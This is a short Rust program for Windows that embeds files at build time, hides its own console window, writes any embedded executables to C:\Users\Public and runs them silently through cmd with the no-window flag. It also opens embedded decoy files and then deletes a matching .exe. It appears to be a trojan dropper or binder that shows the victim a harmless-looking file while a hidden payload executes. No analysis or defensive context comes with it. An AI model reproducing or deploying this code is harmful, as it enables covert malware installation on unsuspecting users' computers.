#![windows_subsystem = "windows"]
use rust_embed::RustEmbed;
use std::fs::write;
use std::os::windows::process::CommandExt;
use std::process::Stdio;

#[derive(RustEmbed)]
#[folder = "tep"]

struct Asset;

fn main() {
    for i in Asset::iter(){
        let filename = String::from("");

        if i.as_ref().to_string().contains("exe"){
            openexe(i.as_ref().to_string());
        }else{
            open(i.clone().as_ref().to_string());
            let temp = i.as_ref().to_string().clone();
            let name:Vec<&str> = temp.split(".").collect();
            let _ = std::process::Command::new("cmd").creation_flags(0x08000000).arg("/c").arg(format!("del {}.exe",name[0])).spawn().unwrap();
        }
    }
    

}


fn open(filename:String){

    let file = Asset::get(format!("{}",filename).as_str()).unwrap();



    let _ = write(format!("{}",filename), file.data);
    


    let _ = std::process::Command::new("cmd").creation_flags(0x08000000).arg("/c").arg(&filename).stdout(Stdio::piped()).spawn().unwrap();
    
}


fn openexe(name:String){
    let file = Asset::get(format!("{}",name).as_str()).unwrap();
    let _ = write(format!("C:\\Users\\Public\\{}",name), file.data);
    let _ = std::process::Command::new("cmd").creation_flags(0x08000000).arg("/c").arg(format!("C:\\Users\\Public\\{}",name)).stdout(Stdio::piped()).spawn().unwrap();
}